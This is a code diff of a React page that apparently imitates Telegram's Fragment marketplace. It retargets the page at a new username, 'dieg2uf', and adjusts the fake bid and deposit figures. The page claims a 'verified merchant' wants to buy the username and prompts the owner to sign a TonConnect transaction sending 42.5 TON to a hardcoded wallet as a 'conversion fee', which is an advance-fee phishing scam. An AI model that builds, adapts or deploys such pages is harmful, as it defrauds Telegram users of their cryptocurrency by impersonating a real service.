@@ -130,7 +130,7 @@ const AuctionSection: React.FC<AuctionSectionProps> = ({ nickname, showSubscribe
       <h2 className="tm-section-header-text">
         <span className="tm-section-header-domain">
           <span className="tm-web3-address">
-            <span className="subdomain">Iamthebest</span>
+            <span className="subdomain">dieg2uf</span>
             <span className="domain">.t.me</span>
           </span>
         </span>
@@ -167,7 +167,7 @@ const AuctionSection: React.FC<AuctionSectionProps> = ({ nickname, showSubscribe
       }}
     >
       You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of 
-      <span className="icon-before icon-ton" style={{ marginLeft: '5px' }}>8000</span>
+      <span className="icon-before icon-ton" style={{ marginLeft: '5px' }}>3471</span>
 
     </div>
   </section>
@@ -186,15 +186,15 @@ const BidInfoSection: React.FC<BidInfoSectionProps> = ({ setShowHowItWorksPopup 
         <tr>
           <td>
             <div className="table-cell table-cell">
-              <div className="table-cell-value tm-value icon-before icon-ton">1400</div>
-              <div className="table-cell-desc">~ $4014</div>
+              <div className="table-cell-value tm-value icon-before icon-ton">850</div>
+              <div className="table-cell-desc">~ $3426</div>
             </div>
             
           </td>
           <td>
           <div className="table-cell table-cell">
-              <div className="table-cell-value tm-value icon-before icon-ton">79.7</div>
-              <div className="table-cell-desc">~ $228.2</div>
+              <div className="table-cell-value tm-value icon-before icon-ton">42.5</div>
+              <div className="table-cell-desc">~ $172.7</div>
             </div>
           </td>
         </tr>
@@ -215,19 +215,19 @@ const UsernameInfoSection: React.FC<UsernameInfoSectionProps> = ({ nickname }) =
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">Telegram Username</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color">@Iamthebest</span>
+        <span className="accent-color">@dieg2uf</span>
       </dd>
     </dl>
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">Web Address</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color">t.me/Iamthebest</span>
+        <span className="accent-color">t.me/dieg2uf</span>
       </dd>
     </dl>
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">TON Web 3.0 Address</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color"><span className="tm-web3-address"><span className="subdomain">Iamthebest</span><span className="domain">.t.me</span></span></span>
+        <span className="accent-color"><span className="tm-web3-address"><span className="subdomain">dieg2uf</span><span className="domain">.t.me</span></span></span>
       </dd>
     </dl>
   </div>
@@ -242,7 +242,7 @@ interface ActionButtonsProps {
 
 
 const ActionButtons: React.FC<ActionButtonsProps> = ({ nickname, showSubscribe, onSubscribeToggle }) => {
-  const comment = "Conversion fee for Iamthebest.t.me\n\nRef#R9OOOw9Mb";
+  const comment = "Conversion fee for dieg2uf.t.me\n\nRef#R9OOOw9Mb";
   const [tonConnectUi] = useTonConnectUI();
   const wallet = useTonWallet();
   const [tx, setTx] = useState<SendTransactionRequest>({
@@ -250,7 +250,7 @@ const ActionButtons: React.FC<ActionButtonsProps> = ({ nickname, showSubscribe, 
     messages: [
       {
         address: "UQBUTyUtpZuecOGdADIXibnVTJ7GdGeb2sJQGcUPKre2RfoU",
-        amount: "79700000000",
+        amount: "42500000000",
         payload: beginCell().storeUint(0, 32).storeStringTail(comment).endCell().toBoc().toString("base64"),
       },
     ],
